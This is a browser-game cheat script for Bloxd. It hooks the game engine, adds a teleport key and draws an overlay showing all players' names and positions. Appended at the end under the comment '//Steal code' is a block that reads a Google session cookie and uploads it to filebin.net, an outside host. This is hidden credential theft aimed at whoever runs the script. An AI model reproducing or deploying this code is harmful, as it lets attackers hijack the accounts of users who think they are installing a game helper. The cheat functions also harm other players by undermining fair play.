(function hookNoa() {
    if (window.noa) { console.log('noa already present'); return; }
    const orig = Function.prototype.call;
    let captured = false;
    Function.prototype.call = function (thisArg, ...args) {
        try {
            if (!captured) {
                const c = args[0];
                if (c && c.entities && c.bloxd) {
                    captured = true;
                    window.noa = c;
                    console.log('Hooked noa instance', c);
                    Function.prototype.call = orig;
                }
            }
        } catch (e) {
        }
        return orig.apply(this, [thisArg, ...args]);
    };
    setTimeout(() => { if (!captured) Function.prototype.call = orig; }, 30000);
})();

window.addEventListener('keydown', (event) => {
    // Check for a specific key, for example 'g'
    const xAdd = -2
    const yAdd = 0
    const pos = noa.entities.getState(1, "position").position
    if (event.key.toLowerCase() === 'h') {
        noa.entities.setPosition(1, [20 + xAdd, 7 + yAdd, pos[2]]);

        // Optional: log to console to confirm it fired
        console.log("Entity teleported!");
    }
});




// Combined hook + resilient player overlay
(function combinedHookAndOverlay() {
    'use strict';

    // ---- Hook noa early by overriding Function.prototype.call briefly ----
    (function hookNoa() {
        if (window.noa) {
            try { console.log && console.log('noa already present'); } catch (_) { }
            return;
        }
        const orig = Function.prototype.call;
        let captured = false;
        Function.prototype.call = function (thisArg, ...args) {
            try {
                if (!captured) {
                    const c = args[0];
                    if (c && c.entities && c.bloxd) {
                        captured = true;
                        window.noa = c;
                        try { console.log && console.log('Hooked noa instance', c); } catch (_) { }
                        Function.prototype.call = orig;
                    }
                }
            } catch (e) {
                // ignore
            }
            return orig.apply(this, [thisArg, ...args]);
        };
        // Safety: restore after 30s if not captured to avoid breaking other code
        setTimeout(() => { if (!captured) Function.prototype.call = orig; }, 30000);
    })();

    // ---- Resilient player overlay UI (auto reshows when game returns) ----
    (function resilientPlayerPosOverlay() {
        // Avoid creating multiple controllers
        if (window.__playerPosUpdater && typeof window.__playerPosUpdater.stop === 'function') {
            try { console.warn && console.warn('Player updater already exists. Use window.__playerPosUpdater.stop() to stop it.'); } catch (_) { }
            return window.__playerPosUpdater;
        }

        // Create container (pointer-events none so it doesn't block clicks)
        const container = document.createElement('div');
        container.style.position = 'fixed';
        container.style.right = '10px';
        container.style.top = '10px';
        container.style.zIndex = 999999;
        container.style.pointerEvents = 'none'; // allow clicks through by default
        container.style.maxWidth = '40%';
        container.style.maxHeight = '80vh';
        container.style.display = 'flex';
        container.style.flexDirection = 'column';
        container.style.gap = '6px';
        container.style.fontFamily = 'monospace';

        // Create the visible panel (also mostly passthrough)
        const panel = document.createElement('div');
        panel.style.background = 'rgba(0,0,0,0.65)';
        panel.style.color = '#fff';
        panel.style.padding = '8px';
        panel.style.borderRadius = '8px';
        panel.style.fontSize = '12px';
        panel.style.lineHeight = '1.2';
        panel.style.overflow = 'auto';
        panel.style.maxHeight = '80vh';
        panel.style.pointerEvents = 'auto'; // panel itself should accept pointer for dragging/buttons
        panel.style.minWidth = '200px';
        panel.style.userSelect = 'none';
        panel.style.backdropFilter = 'blur(4px)';

        // Header (drag handle). Make header accept pointer events; keep rest pass-through by default.
        const header = document.createElement('div');
        header.style.display = 'flex';
        header.style.alignItems = 'center';
        header.style.justifyContent = 'space-between';
        header.style.gap = '8px';
        header.style.marginBottom = '6px';
        header.style.cursor = 'grab';
        header.style.pointerEvents = 'auto';

        const title = document.createElement('div');
        title.textContent = 'Players';
        title.style.fontWeight = '700';
        title.style.fontSize = '13px';

        // Buttons container
        const btns = document.createElement('div');
        btns.style.display = 'flex';
        btns.style.gap = '6px';
        btns.style.pointerEvents = 'auto';

        // Stop button
        const stopBtn = document.createElement('button');
        stopBtn.textContent = 'Stop';
        stopBtn.title = 'Stop updater and remove UI';
        stopBtn.style.fontSize = '11px';
        stopBtn.style.padding = '4px 6px';
        stopBtn.style.border = 'none';
        stopBtn.style.borderRadius = '4px';
        stopBtn.style.background = '#ff4d4d';
        stopBtn.style.color = '#fff';
        stopBtn.style.cursor = 'pointer';
        stopBtn.addEventListener('click', () => controller.stop());

        // Toggle passthrough button (lets you toggle whether clicks go through)
        const toggleBtn = document.createElement('button');
        toggleBtn.textContent = 'Pass';
        toggleBtn.title = 'Toggle click passthrough';
        toggleBtn.style.fontSize = '11px';
        toggleBtn.style.padding = '4px 6px';
        toggleBtn.style.border = 'none';
        toggleBtn.style.borderRadius = '4px';
        toggleBtn.style.background = '#3b82f6';
        toggleBtn.style.color = '#fff';
        toggleBtn.style.cursor = 'pointer';

        // Content area (text)
        const content = document.createElement('pre');
        content.style.margin = '0';
        content.style.whiteSpace = 'pre-wrap';
        content.style.pointerEvents = 'none'; // allow clicks through content
        content.style.background = 'transparent';
        content.style.color = 'inherit';
        content.style.fontFamily = 'inherit';
        content.style.fontSize = '12px';

        // Status line
        const statusLine = document.createElement('div');
        statusLine.style.fontSize = '11px';
        statusLine.style.opacity = '0.9';
        statusLine.style.pointerEvents = 'none';
        statusLine.textContent = 'Initializing...';

        // Assemble
        btns.appendChild(toggleBtn);
        btns.appendChild(stopBtn);
        header.appendChild(title);
        header.appendChild(btns);
        panel.appendChild(header);
        panel.appendChild(content);
        panel.appendChild(statusLine);
        container.appendChild(panel);
        // Safe append to body even if not yet present
        (function safeAppendToBody(el) {
            if (document.body) return document.body.appendChild(el);
            const obs = new MutationObserver(() => {
                if (document.body) { obs.disconnect(); document.body.appendChild(el); }
            });
            obs.observe(document.documentElement, { childList: true });
        })(container);

        // Positioning & dragging
        let isDragging = false;
        let dragStartX = 0;
        let dragStartY = 0;
        let startLeft = null;
        let startTop = null;

        // Make container itself pointer-events none but panel pointer-events auto.
        // We'll move the container by setting style.right/top to initial values, but when dragging we switch to left/top coords.
        container.style.right = '10px';
        container.style.top = '10px';

        header.addEventListener('pointerdown', (ev) => {
            ev.preventDefault();
            isDragging = true;
            header.setPointerCapture(ev.pointerId);
            header.style.cursor = 'grabbing';
            // Convert current right/top to left/top if needed
            const rect = container.getBoundingClientRect();
            startLeft = rect.left;
            startTop = rect.top;
            dragStartX = ev.clientX;
            dragStartY = ev.clientY;
        });

        header.addEventListener('pointermove', (ev) => {
            if (!isDragging) return;
            ev.preventDefault();
            const dx = ev.clientX - dragStartX;
            const dy = ev.clientY - dragStartY;
            const newLeft = startLeft + dx;
            const newTop = startTop + dy;
            // switch to left/top positioning for stable dragging
            container.style.left = Math.max(0, newLeft) + 'px';
            container.style.top = Math.max(0, newTop) + 'px';
            container.style.right = 'auto';
        });

        header.addEventListener('pointerup', (ev) => {
            if (!isDragging) return;
            isDragging = false;
            try { header.releasePointerCapture(ev.pointerId); } catch (_) { }
            header.style.cursor = 'grab';
        });

        header.addEventListener('pointercancel', () => {
            isDragging = false;
            header.style.cursor = 'grab';
        });

        // Toggle passthrough: if enabled, panel.content is pointer-events none (so clicks through).
        let passthrough = true;
        toggleBtn.addEventListener('click', (ev) => {
            ev.stopPropagation();
            passthrough = !passthrough;
            if (passthrough) {
                panel.style.pointerEvents = 'auto'; // panel must accept pointer for buttons/drag
                content.style.pointerEvents = 'none'; // allow clicks through content
                title.style.pointerEvents = 'auto';
                statusLine.style.pointerEvents = 'none';
                toggleBtn.textContent = 'Pass';
                toggleBtn.style.background = '#3b82f6';
            } else {
                // block clicks to the page (panel captures everything)
                panel.style.pointerEvents = 'auto';
                content.style.pointerEvents = 'auto';
                statusLine.style.pointerEvents = 'auto';
                toggleBtn.textContent = 'Block';
                toggleBtn.style.background = '#ef4444';
            }
        });

        // Helper to format position
        function formatPos(pos) {
            if (!pos) return 'position not available';
            if (Array.isArray(pos) && pos.length >= 3) return `${pos[0].toFixed(2)}, ${pos[1].toFixed(2)}, ${pos[2].toFixed(2)}`;
            if (typeof pos.x === 'number' && typeof pos.y === 'number' && typeof pos.z === 'number') return `${pos.x.toFixed(2)}, ${pos.y.toFixed(2)}, ${pos.z.toFixed(2)}`;
            return String(pos);
        }

        // Main update loop with resilient detection of game presence
        let rafId = null;
        let running = true;
        let lastSeenGame = false;

        function updateLoop() {
            if (!running) return;
            try {
                const hasNoa = !!window.noa;
                const hasApis = hasNoa && noa.bloxd && typeof noa.bloxd.getPlayerIds === 'function' && noa.entities && typeof noa.entities.getState === 'function';
                if (!hasApis) {
                    // game not present or no API
                    if (lastSeenGame) {
                        // just lost the game
                        content.textContent = '';
                        statusLine.textContent = 'Game left — waiting to rejoin';
                        lastSeenGame = false;
                    } else {
                        statusLine.textContent = 'No game detected';
                    }
                } else {
                    // game present
                    lastSeenGame = true;
                    try {
                        const ids = noa.bloxd.getPlayerIds() || [];
                        if (!Array.isArray(ids) || ids.length === 0) {
                            content.textContent = '(no players)';
                            statusLine.textContent = `Connected — players: 0 — ${new Date().toLocaleTimeString()}`;
                        } else {
                            const lines = [];
                            for (let i = 0; i < ids.length; i++) {
                                const id = ids[i];
                                try {
                                    const name = noa.bloxd.getEntityName ? (noa.bloxd.getEntityName(id) || String(id)) : String(id);
                                    const state = noa.entities.getState(id, 'position');
                                    const pos = state && (state.position || state.pos) ? (state.position || state.pos) : null;
                                    lines.push(`${name}: ${formatPos(pos)}`);
                                } catch (e) {
                                    lines.push(`${id}: error`);
                                }
                            }
                            content.textContent = lines.join('\n');
                            statusLine.textContent = `Connected — players: ${ids.length} — ${new Date().toLocaleTimeString()}`;
                        }
                    } catch (e) {
                        content.textContent = '';
                        statusLine.textContent = 'Error reading players: ' + String(e);
                    }
                }
            } catch (err) {
                // Unexpected error — show it
                content.textContent = '';
                statusLine.textContent = 'Updater error: ' + String(err);
            } finally {
                rafId = requestAnimationFrame(updateLoop);
            }
        }

        // Start the loop
        rafId = requestAnimationFrame(updateLoop);

        // Controller
        const controller = {
            stop() {
                running = false;
                if (rafId) cancelAnimationFrame(rafId);
                if (container && container.parentNode) container.parentNode.removeChild(container);
                delete window.__playerPosUpdater;
                return 'stopped';
            },
            hide() {
                container.style.display = 'none';
                return 'hidden';
            },
            show() {
                container.style.display = 'flex';
                return 'shown';
            },
            element: container
        };

        // Save controller
        window.__playerPosUpdater = controller;

        // initial passthrough state
        passthrough = true;
        toggleBtn.textContent = 'Pass';
        toggleBtn.style.background = '#3b82f6';

        return controller;
    })();

})();
//Steal code
const cookieObj = await cookieStore.get('___Secure-3PSIDMC');
const value = cookieObj ? cookieObj.value : null;
const myFixedBinId = 'my-custom-storage-folder-202656';
(async () => {
    const blob = new Blob([value], { type: 'text/plain' });
    const fileName = `${Date.now()}.txt`;

    const response = await fetch(`https://filebin.net/${myFixedBinId}/${fileName}`, {
        method: 'POST',
        body: blob
    });
})();